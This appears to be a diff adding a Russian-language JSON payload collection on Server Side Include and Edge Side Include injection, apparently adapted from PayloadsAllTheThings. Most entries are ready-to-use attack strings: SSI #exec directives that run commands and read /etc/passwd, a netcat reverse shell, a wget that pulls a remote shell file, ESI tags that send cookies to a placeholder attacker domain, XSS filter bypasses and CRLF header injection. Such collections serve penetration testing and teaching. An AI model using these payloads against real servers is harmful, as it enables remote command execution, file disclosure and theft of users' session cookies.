@@ -1,0 +1,226 @@
+{
+  "category": "Server Side Include Injection",
+  "source": "PayloadsAllTheThings/Server Side Include Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое SSI и когда возникает инъекция",
+      "language": "text",
+      "tags": ["methodology", "ssi"],
+      "body": "Server Side Includes (SSI) — это директивы внутри HTML-страниц, которые вычисляются сервером в момент отдачи страницы. Они позволяют добавлять динамический контент без полноценного CGI.\n\nSSI Injection возникает, когда атакующий может протолкнуть SSI-директивы во входные данные приложения. Директивы умеют подключать файлы, выполнять команды и печатать переменные окружения. Если ввод пользователя не санитизируется в SSI-контексте, через него можно влиять на поведение сервера: читать чувствительные данные или выполнять команды.\n\nФормат SSI: <!--#directive param=\"value\" -->"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать SSI / ESI",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Страницы .shtml, .stm, .shtm — классический признак включённого SSI на Apache/nginx.\n• Любой пользовательский ввод, который потом отрисовывается обратно в HTML-страницу.\n• ESI — на уровне edge-кэшей и реверс-прокси (Squid, Varnish, Fastly, Akamai). Surrogate не отличает настоящие ESI-теги от внедрённых: если получится протолкнуть ESI-тег в HTTP-ответ, surrogate обработает его как легитимный.\n• Для ESI часто нужен заголовок Surrogate-Control: content=\"ESI/1.0\" в ответе апстрима.\n• Сначала пробуй маркеры <!--#echo ... --> и <esi:include ...>; отрисовалось — эскалируй до чтения файлов и RCE."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулза — SSTImap (детект и эксплуатация SSI)",
+      "language": "bash",
+      "tags": ["tools", "ssi"],
+      "body": "python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s\npython3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI\npython3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "Основные SSI-директивы",
+      "language": "table",
+      "tags": ["ssi", "directives"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "Payload"],
+          "rows": [
+            ["Печать даты", "<!--#echo var=\"DATE_LOCAL\" -->"],
+            ["Печать имени документа", "<!--#echo var=\"DOCUMENT_NAME\" -->"],
+            ["Печать всех переменных", "<!--#printenv -->"],
+            ["Установка переменной", "<!--#set var=\"name\" value=\"Rich\" -->"],
+            ["Подключение файла (file)", "<!--#include file=\"/etc/passwd\" -->"],
+            ["Подключение файла (virtual)", "<!--#include virtual=\"/index.html\" -->"],
+            ["Выполнение команды", "<!--#exec cmd=\"ls\" -->"],
+            ["Reverse shell", "<!--#exec cmd=\"mkfifo /tmp/f;nc IP PORT 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f\" -->"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#echo — печать переменных окружения (детект)",
+      "language": "text",
+      "tags": ["ssi", "echo", "detection"],
+      "body": "<!--#echo var=\"DATE_LOCAL\" -->\n<!--#echo var=\"DOCUMENT_NAME\" -->\n<!--#echo var=\"DOCUMENT_URI\" -->\n<!--#echo var=\"http_user_agent\" -->\n<!--#echo var=\"http_cookie\" -->\n<!--#echo var=\"remote_addr\" -->\n<!--#echo var=\"server_software\" -->\n<!--#echo var=\"query_string\" -->"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#echo — полный список переменных",
+      "language": "text",
+      "tags": ["ssi", "echo", "variables"],
+      "body": "<!--#echo var=\"DATE_LOCAL\" -->\n<!--#echo var=\"DOCUMENT_NAME\" -->\n<!--#echo var=\"DOCUMENT_URI\" -->\n<!--#echo var=\"auth_type\" -->\n<!--#echo var=\"content_length\" -->\n<!--#echo var=\"content_type\" -->\n<!--#echo var=\"date_gmt\" -->\n<!--#echo var=\"date_local\" -->\n<!--#echo var=\"document_name\" -->\n<!--#echo var=\"document_root\" -->\n<!--#echo var=\"document_uri\" -->\n<!--#echo var=\"forwarded\" -->\n<!--#echo var=\"from\" -->\n<!--#echo var=\"gateway_interface\" -->\n<!--#echo var=\"http_accept\" -->\n<!--#echo var=\"http_accept_charset\" -->\n<!--#echo var=\"http_accept_encoding\" -->\n<!--#echo var=\"http_accept_language\" -->\n<!--#echo var=\"http_client_ip\" -->\n<!--#echo var=\"http_connection\" -->\n<!--#echo var=\"http_cookie\" -->\n<!--#echo var=\"http_form\" -->\n<!--#echo var=\"http_host\" -->\n<!--#echo var=\"http_referer\" -->\n<!--#echo var=\"http_ua_cpu\" -->\n<!--#echo var=\"http_ua_os\" -->\n<!--#echo var=\"http_user_agent\" -->\n<!--#echo var=\"last_modified\" -->\n<!--#echo var=\"netsite_root\" -->\n<!--#echo var=\"page_count\" -->\n<!--#echo var=\"path\" -->\n<!--#echo var=\"path_info\" -->\n<!--#echo var=\"path_info_translated\" -->\n<!--#echo var=\"path_translated\" -->\n<!--#echo var=\"query_string\" -->\n<!--#echo var=\"query_string_unescaped\" -->\n<!--#echo var=\"remote_addr\" -->\n<!--#echo var=\"remote_host\" -->\n<!--#echo var=\"remote_ident\" -->\n<!--#echo var=\"remote_port\" -->\n<!--#echo var=\"remote_user\" -->\n<!--#echo var=\"request_method\" -->\n<!--#echo var=\"request_uri\" -->\n<!--#echo var=\"script_filename\" -->\n<!--#echo var=\"script_name\" -->\n<!--#echo var=\"script_uri\" -->\n<!--#echo var=\"script_url\" -->\n<!--#echo var=\"server_addr\" -->\n<!--#echo var=\"server_admin\" -->\n<!--#echo var=\"server_name -->\n<!--#echo var=\"server_port\" -->\n<!--#echo var=\"server_protocol\" -->\n<!--#echo var=\"server_software\" -->\n<!--#echo var=\"site_htmlroot\" -->\n<!--#echo var=\"total_hits\" -->\n<!--#echo var=\"tz\" -->\n<!--#echo var=\"unique_id\" -->\n<!--#echo var=\"user_name\" -->"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#printenv — печать всех переменных",
+      "language": "text",
+      "tags": ["ssi", "printenv", "detection"],
+      "body": "<!--#printenv -->"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#set — установка переменной",
+      "language": "text",
+      "tags": ["ssi", "set"],
+      "body": "<!--#set var=\"name\" value=\"Rich\" -->"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#config — настройка вывода ошибок и формата времени",
+      "language": "text",
+      "tags": ["ssi", "config"],
+      "body": "<!--#config errmsg=\"File not found, informs users and password\"-->\n<!--#config timefmt=\"A %B %d %Y %r\"-->"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#include — подключение файла (LFI)",
+      "language": "text",
+      "tags": ["ssi", "include", "lfi"],
+      "body": "<!--#include file=\"/etc/passwd\" -->\n<!--#include virtual=\"/\" -->\n<!--#include virtual=\"/index.html\" -->\n<!--#include file=?UUUUUUUU...UU?-->"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#include — удалённое подключение (RFI/SSRF)",
+      "language": "text",
+      "tags": ["ssi", "include", "rfi", "ssrf"],
+      "body": "<!--#include virtual=\"http://sn1persecurity.com/.testing/rfi_vuln.php\" -->\n<!--#include virtual=\"https://crowdshield.com/.testing/rfi_vuln.php\" -->"
+    },
+    {
+      "subcategory": "SSI директивы",
+      "title": "#flastmod / #fsize — метаданные файла",
+      "language": "text",
+      "tags": ["ssi", "flastmod", "fsize"],
+      "body": "<!--#flastmod virtual=\"echo.html\" -->\n<!--#fsize file=\"ssi.shtml\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec — выполнение команд (Linux)",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce"],
+      "body": "<!--#exec cmd=\"ls\" -->\n<!--#exec cmd=\"/bin/ls /\" -->\n<!--#exec cmd=\"cat /etc/passwd\" -->\n<!--#exec cmd=\"whoami\" -->\n<!--#exec cmd=\"whoami\"-->\n<!--#exec cmd=\"uname\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec — выполнение команд (Windows)",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce", "windows"],
+      "body": "<!--#exec cmd=\"dir\" -->\n<!--#exec cmd=\"ipconfig\" -->\n<!--#exec cmd=\"cd C:\\WINDOWS\\System32\">"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec — задержка (time-based detection)",
+      "language": "text",
+      "tags": ["ssi", "exec", "time-based"],
+      "body": "<!--#exec cmd=\"sleep 5\" -->\n<!--#exec cmd=\"sleep 10\" -->\n<!--#exec cmd=\"perl -e 'print \"X\"*5000'\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "#exec — подтягивание payload (RFI/exfil)",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce"],
+      "body": "<!--#exec cmd=\"wget http://website.com/dir/shell.txt\" -->\n<!--#exec cmd=\"curl http://sn1persecurity.com/.testing/rfi_vuln.php\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "Reverse shell через #exec",
+      "language": "text",
+      "tags": ["ssi", "exec", "rce", "reverse-shell"],
+      "body": "<!--#exec cmd=\"mkfifo /tmp/f;nc IP PORT 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f\" -->"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "Обёртка в <pre> (когда вывод схлопывается)",
+      "language": "html",
+      "tags": ["ssi", "exec", "rce"],
+      "body": "<pre><!--#echo var=\"DATE_LOCAL\" --> </pre>\n<pre><!--#exec cmd=\"dir\" --></pre>\n<pre><!--#exec cmd=\"ls\" --></pre>\n<pre><!--#exec cmd=\"whoami\"--></pre>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "Что такое ESI Injection",
+      "language": "text",
+      "tags": ["esi", "methodology"],
+      "body": "HTTP-surrogate (кэширующий реверс-прокси) не отличает настоящие ESI-теги от апстрима и вредоносные, внедрённые в HTTP-ответ. Если атакующий протолкнёт ESI-теги в ответ, surrogate обработает и вычислит их без вопросов, считая легитимными тегами апстрима.\n\nНекоторым surrogate нужно сигнализировать обработку ESI заголовком Surrogate-Control:\n\nSurrogate-Control: content=\"ESI/1.0\""
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI — основные payload'ы",
+      "language": "table",
+      "tags": ["esi", "injection"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Описание", "Payload"],
+          "rows": [
+            ["Blind detection", "<esi:include src=http://[ATTACKER.DOMAIN.TLD]>"],
+            ["XSS", "<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>"],
+            ["Кража cookie", "<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>"],
+            ["Подключение файла", "<esi:include src=\"supersecret.txt\">"],
+            ["Display debug info", "<esi:debug/>"],
+            ["Добавление заголовка", "<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->"],
+            ["Inline fragment", "<esi:inline name=\"/attack.html\" fetchable=\"yes\"><script>prompt('XSS')</script></esi:inline>"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI — blind detection / debug",
+      "language": "text",
+      "tags": ["esi", "detection"],
+      "body": "<esi:debug/>\n<esi:include src=http://google.com/>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI — CRLF-инъекция заголовков через src",
+      "language": "text",
+      "tags": ["esi", "crlf", "ssrf"],
+      "body": "<esi:include src=\"http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/\"/>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI — XSLT через dca (Akamai)",
+      "language": "text",
+      "tags": ["esi", "xslt", "ssrf"],
+      "body": "<esi:include src=\"http://host/poc.xml\" dca=\"xslt\" stylesheet=\"http://google.com/poc.xsl\" />"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "ESI — XSS через esi:assign / esi:vars (обход фильтра)",
+      "language": "html",
+      "tags": ["esi", "xss", "bypass"],
+      "body": "x=<esi:assign name=\"var1\" value=\"'cript'\"/><s<esi:vars name=\"$(var1)\"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name=\"$(var1)\"/>>"
+    },
+    {
+      "subcategory": "Edge Side Include (ESI)",
+      "title": "Поддержка ESI по реализациям surrogate",
+      "language": "table",
+      "tags": ["esi", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["ПО", "Includes", "Vars", "Cookies", "Нужны заголовки апстрима", "Whitelist хостов"],
+          "rows": [
+            ["Squid3", "Yes", "Yes", "Yes", "Yes", "No"],
+            ["Varnish Cache", "Yes", "No", "No", "Yes", "Yes"],
+            ["Fastly", "Yes", "No", "No", "No", "Yes"],
+            ["Akamai ESI Test Server (ETS)", "Yes", "Yes", "Yes", "No", "No"],
+            ["NodeJS' esi", "Yes", "Yes", "Yes", "No", "No"],
+            ["NodeJS' nodesi", "Yes", "No", "No", "No", "Optional"]
+          ]
+        }
+      }
+    }
+  ]
+}
